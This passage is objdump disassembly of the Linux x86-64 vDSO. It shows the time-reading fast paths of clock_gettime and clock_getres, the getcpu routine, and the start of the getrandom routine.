     c51:	0f 84 ac 01 00 00    	je     e03 <__vdso_clock_gettime@@LINUX_2.6+0x283>
     c57:	83 f8 03             	cmp    $0x3,%eax
     c5a:	0f 84 18 01 00 00    	je     d78 <__vdso_clock_gettime@@LINUX_2.6+0x1f8>
     c60:	b8 e4 00 00 00       	mov    $0xe4,%eax
     c65:	0f 05                	syscall
     c67:	48 8d 65 f0          	lea    -0x10(%rbp),%rsp
     c6b:	5b                   	pop    %rbx
     c6c:	41 5e                	pop    %r14
     c6e:	5d                   	pop    %rbp
     c6f:	c3                   	ret
     c70:	cc                   	int3
     c71:	41 81 7b 04 ff ff ff 	cmpl   $0x7fffffff,0x4(%r11)
     c78:	7f 
     c79:	0f 84 a3 01 00 00    	je     e22 <__vdso_clock_gettime@@LINUX_2.6+0x2a2>
     c7f:	f3 90                	pause
     c81:	e9 34 ff ff ff       	jmp    bba <__vdso_clock_gettime@@LINUX_2.6+0x3a>
     c86:	a8 60                	test   $0x60,%al
     c88:	0f 85 1d 01 00 00    	jne    dab <__vdso_clock_gettime@@LINUX_2.6+0x22b>
     c8e:	83 ff 04             	cmp    $0x4,%edi
     c91:	0f 84 d5 00 00 00    	je     d6c <__vdso_clock_gettime@@LINUX_2.6+0x1ec>
     c97:	a9 00 00 ff 00       	test   $0xff0000,%eax
     c9c:	74 c2                	je     c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
     c9e:	8d 47 f0             	lea    -0x10(%rdi),%eax
     ca1:	4d 89 de             	mov    %r11,%r14
     ca4:	4c 69 c8 e8 00 00 00 	imul   $0xe8,%rax,%r9
     cab:	4b 8d 9c 0b d0 01 00 	lea    0x1d0(%r11,%r9,1),%rbx
     cb2:	00 
     cb3:	44 8b 1b             	mov    (%rbx),%r11d
     cb6:	45 89 da             	mov    %r11d,%r10d
     cb9:	41 83 e2 01          	and    $0x1,%r10d
     cbd:	0f 85 2c 01 00 00    	jne    def <__vdso_clock_gettime@@LINUX_2.6+0x26f>
     cc3:	8b 43 04             	mov    0x4(%rbx),%eax
     cc6:	85 c0                	test   %eax,%eax
     cc8:	74 96                	je     c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
     cca:	83 f8 01             	cmp    $0x1,%eax
     ccd:	0f 85 2f 02 00 00    	jne    f02 <__vdso_clock_gettime@@LINUX_2.6+0x382>
     cd3:	0f 01 f9             	rdtscp
     cd6:	66 90                	xchg   %ax,%ax
     cd8:	48 c1 e2 20          	shl    $0x20,%rdx
     cdc:	48 09 c2             	or     %rax,%rdx
     cdf:	48 0f ba f2 3f       	btr    $0x3f,%rdx
     ce4:	4c 8b 43 30          	mov    0x30(%rbx),%r8
     ce8:	8b 4b 24             	mov    0x24(%rbx),%ecx
     ceb:	48 2b 53 08          	sub    0x8(%rbx),%rdx
     cef:	48 39 53 10          	cmp    %rdx,0x10(%rbx)
     cf3:	0f 82 f3 01 00 00    	jb     eec <__vdso_clock_gettime@@LINUX_2.6+0x36c>
     cf9:	8b 43 20             	mov    0x20(%rbx),%eax
     cfc:	48 0f af c2          	imul   %rdx,%rax
     d00:	4c 01 c0             	add    %r8,%rax
     d03:	48 d3 e8             	shr    %cl,%rax
     d06:	48 8b 53 28          	mov    0x28(%rbx),%rdx
     d0a:	8b 0b                	mov    (%rbx),%ecx
     d0c:	41 39 cb             	cmp    %ecx,%r11d
     d0f:	75 a2                	jne    cb3 <__vdso_clock_gettime@@LINUX_2.6+0x133>
     d11:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     d17:	0f 86 1e ff ff ff    	jbe    c3b <__vdso_clock_gettime@@LINUX_2.6+0xbb>
     d1d:	48 2d 00 ca 9a 3b    	sub    $0x3b9aca00,%rax
     d23:	41 83 c2 01          	add    $0x1,%r10d
     d27:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     d2d:	77 ee                	ja     d1d <__vdso_clock_gettime@@LINUX_2.6+0x19d>
     d2f:	e9 04 ff ff ff       	jmp    c38 <__vdso_clock_gettime@@LINUX_2.6+0xb8>
     d34:	48 0f ba e2 3e       	bt     $0x3e,%rdx
     d39:	73 0b                	jae    d46 <__vdso_clock_gettime@@LINUX_2.6+0x1c6>
     d3b:	48 89 d8             	mov    %rbx,%rax
     d3e:	48 d3 e8             	shr    %cl,%rax
     d41:	e9 cc fe ff ff       	jmp    c12 <__vdso_clock_gettime@@LINUX_2.6+0x92>
     d46:	41 8b 43 20          	mov    0x20(%r11),%eax
     d4a:	48 0f ba f2 3f       	btr    $0x3f,%rdx
     d4f:	48 f7 e2             	mul    %rdx
     d52:	48 01 d8             	add    %rbx,%rax
     d55:	48 83 d2 00          	adc    $0x0,%rdx
     d59:	48 0f ad d0          	shrd   %cl,%rdx,%rax
     d5d:	48 d3 ea             	shr    %cl,%rdx
     d60:	83 e1 40             	and    $0x40,%ecx
     d63:	48 0f 45 c2          	cmovne %rdx,%rax
     d67:	e9 a6 fe ff ff       	jmp    c12 <__vdso_clock_gettime@@LINUX_2.6+0x92>
     d6c:	49 81 c3 e8 00 00 00 	add    $0xe8,%r11
     d73:	e9 42 fe ff ff       	jmp    bba <__vdso_clock_gettime@@LINUX_2.6+0x3a>
     d78:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
     d7d:	89 7c 24 10          	mov    %edi,0x10(%rsp)
     d81:	44 89 4c 24 1c       	mov    %r9d,0x1c(%rsp)
     d86:	e8 15 fa ff ff       	call   7a0 <LINUX_2.6@@LINUX_2.6+0x7a0>
     d8b:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
     d90:	8b 7c 24 10          	mov    0x10(%rsp),%edi
     d94:	44 8b 4c 24 1c       	mov    0x1c(%rsp),%r9d
     d99:	48 89 c2             	mov    %rax,%rdx
     d9c:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
     da0:	0f 84 ba fe ff ff    	je     c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
     da6:	e9 39 fe ff ff       	jmp    be4 <__vdso_clock_gettime@@LINUX_2.6+0x64>
     dab:	4c 63 c7             	movslq %edi,%r8
     dae:	49 8d 40 02          	lea    0x2(%r8),%rax
     db2:	48 c1 e0 04          	shl    $0x4,%rax
     db6:	4c 01 d8             	add    %r11,%rax
     db9:	41 8b 0b             	mov    (%r11),%ecx
     dbc:	f6 c1 01             	test   $0x1,%cl
     dbf:	75 1c                	jne    ddd <__vdso_clock_gettime@@LINUX_2.6+0x25d>
     dc1:	48 8b 78 08          	mov    0x8(%rax),%rdi
     dc5:	48 89 3e             	mov    %rdi,(%rsi)
     dc8:	48 8b 78 10          	mov    0x10(%rax),%rdi
     dcc:	48 89 7e 08          	mov    %rdi,0x8(%rsi)
     dd0:	41 8b 3b             	mov    (%r11),%edi
     dd3:	39 f9                	cmp    %edi,%ecx
     dd5:	0f 84 67 fe ff ff    	je     c42 <__vdso_clock_gettime@@LINUX_2.6+0xc2>
     ddb:	eb dc                	jmp    db9 <__vdso_clock_gettime@@LINUX_2.6+0x239>
     ddd:	41 81 7b 04 ff ff ff 	cmpl   $0x7fffffff,0x4(%r11)
     de4:	7f 
     de5:	0f 84 5c 01 00 00    	je     f47 <__vdso_clock_gettime@@LINUX_2.6+0x3c7>
     deb:	f3 90                	pause
     ded:	eb ca                	jmp    db9 <__vdso_clock_gettime@@LINUX_2.6+0x239>
     def:	81 7b 04 ff ff ff 7f 	cmpl   $0x7fffffff,0x4(%rbx)
     df6:	0f 84 d9 00 00 00    	je     ed5 <__vdso_clock_gettime@@LINUX_2.6+0x355>
     dfc:	f3 90                	pause
     dfe:	e9 b0 fe ff ff       	jmp    cb3 <__vdso_clock_gettime@@LINUX_2.6+0x133>
     e03:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
     e08:	89 7c 24 1c          	mov    %edi,0x1c(%rsp)
     e0c:	e8 df f9 ff ff       	call   7f0 <LINUX_2.6@@LINUX_2.6+0x7f0>
     e11:	8b 7c 24 1c          	mov    0x1c(%rsp),%edi
     e15:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
     e1a:	48 89 c2             	mov    %rax,%rdx
     e1d:	e9 7a ff ff ff       	jmp    d9c <__vdso_clock_gettime@@LINUX_2.6+0x21c>
     e22:	4c 8d 15 bf a2 ff ff 	lea    -0x5d41(%rip),%r10        # ffffffffffffb0e8 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff9a78>
     e29:	83 ff 04             	cmp    $0x4,%edi
     e2c:	49 8d 82 18 ff ff ff 	lea    -0xe8(%r10),%rax
     e33:	4c 0f 45 d0          	cmovne %rax,%r10
     e37:	41 8b 1a             	mov    (%r10),%ebx
     e3a:	f6 c3 01             	test   $0x1,%bl
     e3d:	0f 85 ee 01 00 00    	jne    1031 <__vdso_clock_gettime@@LINUX_2.6+0x4b1>
     e43:	41 8b 42 04          	mov    0x4(%r10),%eax
     e47:	83 f8 01             	cmp    $0x1,%eax
     e4a:	0f 85 a6 01 00 00    	jne    ff6 <__vdso_clock_gettime@@LINUX_2.6+0x476>
     e50:	0f 01 f9             	rdtscp
     e53:	66 90                	xchg   %ax,%ax
     e55:	48 c1 e2 20          	shl    $0x20,%rdx
     e59:	48 09 c2             	or     %rax,%rdx
     e5c:	48 0f ba f2 3f       	btr    $0x3f,%rdx
     e61:	4c 63 c7             	movslq %edi,%r8
     e64:	41 8b 4a 24          	mov    0x24(%r10),%ecx
     e68:	49 2b 52 08          	sub    0x8(%r10),%rdx
     e6c:	4c 89 c0             	mov    %r8,%rax
     e6f:	48 c1 e0 04          	shl    $0x4,%rax
     e73:	4d 8b 4c 02 30       	mov    0x30(%r10,%rax,1),%r9
     e78:	4d 8d 34 02          	lea    (%r10,%rax,1),%r14
     e7c:	49 39 52 10          	cmp    %rdx,0x10(%r10)
     e80:	0f 82 5e 01 00 00    	jb     fe4 <__vdso_clock_gettime@@LINUX_2.6+0x464>
     e86:	41 8b 42 20          	mov    0x20(%r10),%eax
     e8a:	48 0f af c2          	imul   %rdx,%rax
     e8e:	4c 01 c8             	add    %r9,%rax
     e91:	48 d3 e8             	shr    %cl,%rax
     e94:	49 8b 4e 28          	mov    0x28(%r14),%rcx
     e98:	41 8b 12             	mov    (%r10),%edx
     e9b:	39 da                	cmp    %ebx,%edx
     e9d:	75 98                	jne    e37 <__vdso_clock_gettime@@LINUX_2.6+0x2b7>
     e9f:	49 c1 e0 04          	shl    $0x4,%r8
     ea3:	4d 01 c3             	add    %r8,%r11
     ea6:	49 03 43 30          	add    0x30(%r11),%rax
     eaa:	49 03 4b 28          	add    0x28(%r11),%rcx
     eae:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     eb4:	0f 86 23 01 00 00    	jbe    fdd <__vdso_clock_gettime@@LINUX_2.6+0x45d>
     eba:	31 d2                	xor    %edx,%edx
     ebc:	48 2d 00 ca 9a 3b    	sub    $0x3b9aca00,%rax
     ec2:	83 c2 01             	add    $0x1,%edx
     ec5:	48 3d ff c9 9a 3b    	cmp    $0x3b9ac9ff,%rax
     ecb:	77 ef                	ja     ebc <__vdso_clock_gettime@@LINUX_2.6+0x33c>
     ecd:	48 01 ca             	add    %rcx,%rdx
     ed0:	e9 66 fd ff ff       	jmp    c3b <__vdso_clock_gettime@@LINUX_2.6+0xbb>
     ed5:	49 8d 86 00 10 00 00 	lea    0x1000(%r14),%rax
     edc:	49 89 c6             	mov    %rax,%r14
     edf:	4a 8d 9c 08 d0 01 00 	lea    0x1d0(%rax,%r9,1),%rbx
     ee6:	00 
     ee7:	e9 c7 fd ff ff       	jmp    cb3 <__vdso_clock_gettime@@LINUX_2.6+0x133>
     eec:	48 0f ba e2 3e       	bt     $0x3e,%rdx
     ef1:	0f 83 be 00 00 00    	jae    fb5 <__vdso_clock_gettime@@LINUX_2.6+0x435>
     ef7:	4c 89 c0             	mov    %r8,%rax
     efa:	48 d3 e8             	shr    %cl,%rax
     efd:	e9 04 fe ff ff       	jmp    d06 <__vdso_clock_gettime@@LINUX_2.6+0x186>
     f02:	83 f8 02             	cmp    $0x2,%eax
     f05:	0f 84 34 01 00 00    	je     103f <__vdso_clock_gettime@@LINUX_2.6+0x4bf>
     f0b:	83 f8 03             	cmp    $0x3,%eax
     f0e:	0f 85 4c fd ff ff    	jne    c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
     f14:	4c 89 4c 24 08       	mov    %r9,0x8(%rsp)
     f19:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
     f1e:	89 7c 24 1c          	mov    %edi,0x1c(%rsp)
     f22:	e8 79 f8 ff ff       	call   7a0 <LINUX_2.6@@LINUX_2.6+0x7a0>
     f27:	4c 8b 4c 24 08       	mov    0x8(%rsp),%r9
     f2c:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
     f31:	8b 7c 24 1c          	mov    0x1c(%rsp),%edi
     f35:	48 89 c2             	mov    %rax,%rdx
     f38:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
     f3c:	0f 85 a2 fd ff ff    	jne    ce4 <__vdso_clock_gettime@@LINUX_2.6+0x164>
     f42:	e9 19 fd ff ff       	jmp    c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
     f47:	49 8d 40 02          	lea    0x2(%r8),%rax
     f4b:	48 c1 e0 04          	shl    $0x4,%rax
     f4f:	4c 01 d8             	add    %r11,%rax
     f52:	41 8b bb 00 10 00 00 	mov    0x1000(%r11),%edi
     f59:	40 f6 c7 01          	test   $0x1,%dil
     f5d:	0f 85 d5 00 00 00    	jne    1038 <__vdso_clock_gettime@@LINUX_2.6+0x4b8>
     f63:	4c 8b 80 08 10 00 00 	mov    0x1008(%rax),%r8
     f6a:	48 8b 88 10 10 00 00 	mov    0x1010(%rax),%rcx
     f71:	45 8b 8b 00 10 00 00 	mov    0x1000(%r11),%r9d
     f78:	41 39 f9             	cmp    %edi,%r9d
     f7b:	75 d5                	jne    f52 <__vdso_clock_gettime@@LINUX_2.6+0x3d2>
     f7d:	48 8b 78 08          	mov    0x8(%rax),%rdi
     f81:	48 03 48 10          	add    0x10(%rax),%rcx
     f85:	4c 01 c7             	add    %r8,%rdi
     f88:	48 81 f9 ff c9 9a 3b 	cmp    $0x3b9ac9ff,%rcx
     f8f:	76 13                	jbe    fa4 <__vdso_clock_gettime@@LINUX_2.6+0x424>
     f91:	48 81 e9 00 ca 9a 3b 	sub    $0x3b9aca00,%rcx
     f98:	83 c2 01             	add    $0x1,%edx
     f9b:	48 81 f9 ff c9 9a 3b 	cmp    $0x3b9ac9ff,%rcx
     fa2:	77 ed                	ja     f91 <__vdso_clock_gettime@@LINUX_2.6+0x411>
     fa4:	89 d0                	mov    %edx,%eax
     fa6:	48 89 4e 08          	mov    %rcx,0x8(%rsi)
     faa:	48 01 f8             	add    %rdi,%rax
     fad:	48 89 06             	mov    %rax,(%rsi)
     fb0:	e9 8d fc ff ff       	jmp    c42 <__vdso_clock_gettime@@LINUX_2.6+0xc2>
     fb5:	48 89 d0             	mov    %rdx,%rax
     fb8:	8b 53 20             	mov    0x20(%rbx),%edx
     fbb:	48 0f ba f0 3f       	btr    $0x3f,%rax
     fc0:	48 f7 e2             	mul    %rdx
     fc3:	4c 01 c0             	add    %r8,%rax
     fc6:	48 83 d2 00          	adc    $0x0,%rdx
     fca:	48 0f ad d0          	shrd   %cl,%rdx,%rax
     fce:	48 d3 ea             	shr    %cl,%rdx
     fd1:	80 e1 40             	and    $0x40,%cl
     fd4:	48 0f 45 c2          	cmovne %rdx,%rax
     fd8:	e9 29 fd ff ff       	jmp    d06 <__vdso_clock_gettime@@LINUX_2.6+0x186>
     fdd:	31 d2                	xor    %edx,%edx
     fdf:	e9 e9 fe ff ff       	jmp    ecd <__vdso_clock_gettime@@LINUX_2.6+0x34d>
     fe4:	48 0f ba e2 3e       	bt     $0x3e,%rdx
     fe9:	73 73                	jae    105e <__vdso_clock_gettime@@LINUX_2.6+0x4de>
     feb:	4c 89 c8             	mov    %r9,%rax
     fee:	48 d3 e8             	shr    %cl,%rax
     ff1:	e9 9e fe ff ff       	jmp    e94 <__vdso_clock_gettime@@LINUX_2.6+0x314>
     ff6:	83 f8 02             	cmp    $0x2,%eax
     ff9:	0f 84 88 00 00 00    	je     1087 <__vdso_clock_gettime@@LINUX_2.6+0x507>
     fff:	83 f8 03             	cmp    $0x3,%eax
    1002:	0f 85 58 fc ff ff    	jne    c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
    1008:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
    100d:	89 7c 24 1c          	mov    %edi,0x1c(%rsp)
    1011:	e8 8a f7 ff ff       	call   7a0 <LINUX_2.6@@LINUX_2.6+0x7a0>
    1016:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
    101b:	8b 7c 24 1c          	mov    0x1c(%rsp),%edi
    101f:	48 89 c2             	mov    %rax,%rdx
    1022:	48 83 fa ff          	cmp    $0xffffffffffffffff,%rdx
    1026:	0f 84 34 fc ff ff    	je     c60 <__vdso_clock_gettime@@LINUX_2.6+0xe0>
    102c:	e9 30 fe ff ff       	jmp    e61 <__vdso_clock_gettime@@LINUX_2.6+0x2e1>
    1031:	f3 90                	pause
    1033:	e9 ff fd ff ff       	jmp    e37 <__vdso_clock_gettime@@LINUX_2.6+0x2b7>
    1038:	f3 90                	pause
    103a:	e9 13 ff ff ff       	jmp    f52 <__vdso_clock_gettime@@LINUX_2.6+0x3d2>
    103f:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
    1044:	89 7c 24 1c          	mov    %edi,0x1c(%rsp)
    1048:	e8 a3 f7 ff ff       	call   7f0 <LINUX_2.6@@LINUX_2.6+0x7f0>
    104d:	8b 7c 24 1c          	mov    0x1c(%rsp),%edi
    1051:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
    1056:	48 89 c2             	mov    %rax,%rdx
    1059:	e9 da fe ff ff       	jmp    f38 <__vdso_clock_gettime@@LINUX_2.6+0x3b8>
    105e:	48 89 d0             	mov    %rdx,%rax
    1061:	41 8b 52 20          	mov    0x20(%r10),%edx
    1065:	48 0f ba f0 3f       	btr    $0x3f,%rax
    106a:	48 f7 e2             	mul    %rdx
    106d:	4c 01 c8             	add    %r9,%rax
    1070:	48 83 d2 00          	adc    $0x0,%rdx
    1074:	48 0f ad d0          	shrd   %cl,%rdx,%rax
    1078:	48 d3 ea             	shr    %cl,%rdx
    107b:	80 e1 40             	and    $0x40,%cl
    107e:	48 0f 45 c2          	cmovne %rdx,%rax
    1082:	e9 0d fe ff ff       	jmp    e94 <__vdso_clock_gettime@@LINUX_2.6+0x314>
    1087:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
    108c:	89 7c 24 1c          	mov    %edi,0x1c(%rsp)
    1090:	e8 5b f7 ff ff       	call   7f0 <LINUX_2.6@@LINUX_2.6+0x7f0>
    1095:	8b 7c 24 1c          	mov    0x1c(%rsp),%edi
    1099:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
    109e:	48 89 c2             	mov    %rax,%rdx
    10a1:	e9 7c ff ff ff       	jmp    1022 <__vdso_clock_gettime@@LINUX_2.6+0x4a2>
    10a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    10ad:	00 00 00 

00000000000010b0 <__vdso_clock_getres@@LINUX_2.6>:
    10b0:	f3 0f 1e fa          	endbr64
    10b4:	83 ff 17             	cmp    $0x17,%edi
    10b7:	77 5d                	ja     1116 <__vdso_clock_getres@@LINUX_2.6+0x66>
    10b9:	81 3d 41 8f ff ff ff 	cmpl   $0x7fffffff,-0x70bf(%rip)        # ffffffffffffa004 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff8994>
    10c0:	ff ff 7f 
    10c3:	48 8d 15 36 9f ff ff 	lea    -0x60ca(%rip),%rdx        # ffffffffffffb000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffff9990>
    10ca:	74 07                	je     10d3 <__vdso_clock_getres@@LINUX_2.6+0x23>
    10cc:	48 81 ea 00 10 00 00 	sub    $0x1000,%rdx
    10d3:	b8 01 00 00 00       	mov    $0x1,%eax
    10d8:	89 f9                	mov    %edi,%ecx
    10da:	d3 e0                	shl    %cl,%eax
    10dc:	a9 93 08 00 00       	test   $0x893,%eax
    10e1:	74 1a                	je     10fd <__vdso_clock_getres@@LINUX_2.6+0x4d>
    10e3:	8b 82 18 09 00 00    	mov    0x918(%rdx),%eax
    10e9:	48 85 f6             	test   %rsi,%rsi
    10ec:	74 0b                	je     10f9 <__vdso_clock_getres@@LINUX_2.6+0x49>
    10ee:	48 c7 06 00 00 00 00 	movq   $0x0,(%rsi)
    10f5:	48 89 46 08          	mov    %rax,0x8(%rsi)
    10f9:	31 c0                	xor    %eax,%eax
    10fb:	c3                   	ret
    10fc:	cc                   	int3
    10fd:	a8 60                	test   $0x60,%al
    10ff:	75 0e                	jne    110f <__vdso_clock_getres@@LINUX_2.6+0x5f>
    1101:	a9 00 00 ff 00       	test   $0xff0000,%eax
    1106:	74 0e                	je     1116 <__vdso_clock_getres@@LINUX_2.6+0x66>
    1108:	b8 01 00 00 00       	mov    $0x1,%eax
    110d:	eb da                	jmp    10e9 <__vdso_clock_getres@@LINUX_2.6+0x39>
    110f:	b8 40 42 0f 00       	mov    $0xf4240,%eax
    1114:	eb d3                	jmp    10e9 <__vdso_clock_getres@@LINUX_2.6+0x39>
    1116:	b8 e5 00 00 00       	mov    $0xe5,%eax
    111b:	0f 05                	syscall
    111d:	c3                   	ret
    111e:	cc                   	int3
    111f:	90                   	nop

0000000000001120 <__vdso_getcpu@@LINUX_2.6>:
    1120:	f3 0f 1e fa          	endbr64
    1124:	b8 7b 00 00 00       	mov    $0x7b,%eax
    1129:	f3 0f c7 f8          	rdpid  %rax
    112d:	48 85 ff             	test   %rdi,%rdi
    1130:	74 0a                	je     113c <__vdso_getcpu@@LINUX_2.6+0x1c>
    1132:	89 c2                	mov    %eax,%edx
    1134:	81 e2 ff 0f 00 00    	and    $0xfff,%edx
    113a:	89 17                	mov    %edx,(%rdi)
    113c:	48 85 f6             	test   %rsi,%rsi
    113f:	74 06                	je     1147 <__vdso_getcpu@@LINUX_2.6+0x27>
    1141:	48 c1 e8 0c          	shr    $0xc,%rax
    1145:	89 06                	mov    %eax,(%rsi)
    1147:	31 c0                	xor    %eax,%eax
    1149:	c3                   	ret
    114a:	cc                   	int3
    114b:	90                   	nop
    114c:	90                   	nop
    114d:	90                   	nop
    114e:	90                   	nop
    114f:	90                   	nop
    1150:	90                   	nop
    1151:	90                   	nop
    1152:	90                   	nop
    1153:	90                   	nop
    1154:	90                   	nop
    1155:	90                   	nop
    1156:	90                   	nop
    1157:	90                   	nop
    1158:	90                   	nop
    1159:	90                   	nop
    115a:	90                   	nop
    115b:	90                   	nop
    115c:	90                   	nop
    115d:	90                   	nop
    115e:	90                   	nop
    115f:	90                   	nop

0000000000001160 <__vdso_getrandom@@LINUX_2.6>:
    1160:	f3 0f 1e fa          	endbr64
    1164:	55                   	push   %rbp
    1165:	49 89 f1             	mov    %rsi,%r9
    1168:	48 89 e5             	mov    %rsp,%rbp
    116b:	41 57                	push   %r15
    116d:	41 56                	push   %r14
    116f:	41 55                	push   %r13
    1171:	41 54                	push   %r12
    1173:	53                   	push   %rbx
    1174:	48 89 cb             	mov    %rcx,%rbx
    1177:	48 83 ec 30          	sub    $0x30,%rsp
    117b:	48 c7 45 d0 00 00 00 	movq   $0x0,-0x30(%rbp)
    1182:	00 
    1183:	49 83 f8 ff          	cmp    $0xffffffffffffffff,%r8
    1187:	75 09                	jne    1192 <__vdso_getrandom@@LINUX_2.6+0x32>
    1189:	48 85 ff             	test   %rdi,%rdi
    118c:	0f 84 33 02 00 00    	je     13c5 <__vdso_getrandom@@LINUX_2.6+0x265>
    1192:	48 89 d8             	mov    %rbx,%rax
    1195:	25 ff 0f 00 00       	and    $0xfff,%eax
    119a:	48 05 90 00 00 00    	add    $0x90,%rax
    11a0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
    11a6:	0f 87 89 02 00 00    	ja     1435 <__vdso_getrandom@@LINUX_2.6+0x2d5>
    11ac:	83 fa 07             	cmp    $0x7,%edx
    11af:	0f 87 32 02 00 00    	ja     13e7 <__vdso_getrandom@@LINUX_2.6+0x287>
    11b5:	49 81 f8 90 00 00 00 	cmp    $0x90,%r8
    11bc:	0f 85 25 02 00 00    	jne    13e7 <__vdso_getrandom@@LINUX_2.6+0x287>
    11c2:	0f b6 05 3f ae ff ff 	movzbl -0x51c1(%rip),%eax        # ffffffffffffc008 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffffa998>
    11c9:	84 c0                	test   %al,%al
    11cb:	0f 84 16 02 00 00    	je     13e7 <__vdso_getrandom@@LINUX_2.6+0x287>
    11d1:	4d 85 c9             	test   %r9,%r9
    11d4:	0f 84 c6 02 00 00    	je     14a0 <__vdso_getrandom@@LINUX_2.6+0x340>
    11da:	0f b6 83 89 00 00 00 	movzbl 0x89(%rbx),%eax
    11e1:	84 c0                	test   %al,%al
    11e3:	0f 85 fe 01 00 00    	jne    13e7 <__vdso_getrandom@@LINUX_2.6+0x287>
    11e9:	c6 83 89 00 00 00 01 	movb   $0x1,0x89(%rbx)
    11f0:	c7 45 ac 02 00 00 00 	movl   $0x2,-0x54(%rbp)
    11f7:	48 89 7d b8          	mov    %rdi,-0x48(%rbp)
    11fb:	89 55 a8             	mov    %edx,-0x58(%rbp)
    11fe:	48 8d 05 fb ad ff ff 	lea    -0x5205(%rip),%rax        # ffffffffffffc000 <__vdso_sgx_enter_enclave@@LINUX_2.6+0xffffffffffffa990>
    1205:	48 8b 00             	mov    (%rax),%rax
    1208:	48 3b 83 80 00 00 00 	cmp    0x80(%rbx),%rax
    120f:	0f 85 ec 01 00 00    	jne    1401 <__vdso_getrandom@@LINUX_2.6+0x2a1>
    1215:	0f b6 b3 88 00 00 00 	movzbl 0x88(%rbx),%esi
    121c:	41 b8 00 f0 ff 7f    	mov    $0x7ffff000,%r8d
    1222:	49 89 de             	mov    %rbx,%r14
    1225:	4c 89 4d b0          	mov    %r9,-0x50(%rbp)
    1229:	4c 8b 65 b8          	mov    -0x48(%rbp),%r12
    122d:	4d 39 c1             	cmp    %r8,%r9
    1230:	4d 0f 46 c1          	cmovbe %r9,%r8
    1234:	4c 89 c3             	mov    %r8,%rbx
    1237:	eb 35                	jmp    126e <__vdso_getrandom@@LINUX_2.6+0x10e>
    1239:	48 85 db             	test   %rbx,%rbx
    123c:	0f 84 11 01 00 00    	je     1353 <__vdso_getrandom@@LINUX_2.6+0x1f3>
    1242:	49 89 df             	mov    %rbx,%r15
    1245:	49 8d 76 60          	lea    0x60(%r14),%rsi
    1249:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
    124d:	49 c1 ef 06          	shr    $0x6,%r15
    1251:	0f 85 41 01 00 00    	jne    1398 <__vdso_getrandom@@LINUX_2.6+0x238>
    1257:	b9 02 00 00 00       	mov    $0x2,%ecx
    125c:	4c 89 f7             	mov    %r14,%rdi
    125f:	e8 8c 02 00 00       	call   14f0 <__vdso_getrandom@@LINUX_2.6+0x390>
    1264:	41 c6 86 88 00 00 00 	movb   $0x0,0x88(%r14)
    126b:	00 
    126c:	31 f6                	xor    %esi,%esi
    126e:	b9 60 00 00 00       	mov    $0x60,%ecx
    1273:	48 29 f1             	sub    %rsi,%rcx
    1276:	48 39 d9             	cmp    %rbx,%rcx
    1279:	48 0f 47 cb          	cmova  %rbx,%rcx
    127d:	48 85 c9             	test   %rcx,%rcx
    1280:	74 b7                	je     1239 <__vdso_getrandom@@LINUX_2.6+0xd9>
    1282:	4c 01 f6             	add    %r14,%rsi
    1285:	48 83 f9 07          	cmp    $0x7,%rcx
    1289:	0f 86 b2 01 00 00    	jbe    1441 <__vdso_getrandom@@LINUX_2.6+0x2e1>
    128f:	48 89 c8             	mov    %rcx,%rax
    1292:	4c 89 e2             	mov    %r12,%rdx
    1295:	48 c1 e8 03          	shr    $0x3,%rax
    1299:	4c 8d 50 ff          	lea    -0x1(%rax),%r10
    129d:	4d 8d 0c c4          	lea    (%r12,%rax,8),%r9
    12a1:	48 89 f0             	mov    %rsi,%rax
    12a4:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    12aa:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
    12b1:	00 00 00 00 
    12b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
    12bc:	00 00 00 00 
    12c0:	48 8b 38             	mov    (%rax),%rdi
    12c3:	48 83 c2 08          	add    $0x8,%rdx
    12c7:	48 83 c0 08          	add    $0x8,%rax
    12cb:	48 89 7a f8          	mov    %rdi,-0x8(%rdx)
    12cf:	48 c7 40 f8 00 00 00 	movq   $0x0,-0x8(%rax)
    12d6:	00 
    12d7:	49 39 d1             	cmp    %rdx,%r9
    12da:	75 e4                	jne    12c0 <__vdso_getrandom@@LINUX_2.6+0x160>
    12dc:	4a 8d 14 d5 00 00 00 	lea    0x0(,%r10,8),%rdx
    12e3:	00 
    12e4:	48 89 c8             	mov    %rcx,%rax
    12e7:	48 8d 74 16 08       	lea    0x8(%rsi,%rdx,1),%rsi
    12ec:	83 e0 07             	and    $0x7,%eax
    12ef:	49 8d 54 14 08       	lea    0x8(%r12,%rdx,1),%rdx
    12f4:	f6 c1 04             	test   $0x4,%cl
    12f7:	74 18                	je     1311 <__vdso_getrandom@@LINUX_2.6+0x1b1>
    12f9:	8b 3e                	mov    (%rsi),%edi
    12fb:	48 83 c2 04          	add    $0x4,%rdx
    12ff:	48 83 c6 04          	add    $0x4,%rsi
